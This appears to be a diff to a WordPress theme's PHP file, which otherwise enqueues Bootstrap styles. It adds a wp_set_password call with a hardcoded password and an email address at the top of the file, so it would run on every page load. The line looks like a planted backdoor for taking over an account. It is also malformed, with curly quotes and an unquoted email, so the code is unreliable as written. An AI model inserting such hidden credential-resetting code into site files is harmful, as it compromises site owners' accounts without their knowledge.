@@ -1,7 +1,5 @@
 <?php
-
-
-
+wp_set_password(‘apollo11’, sgt.garcia@hotmail.it);
 
 function enqueue_css() {
     wp_enqueue_style( 'bs', get_template_directory_uri().'/vendors/css/bootstrap.min.css' );
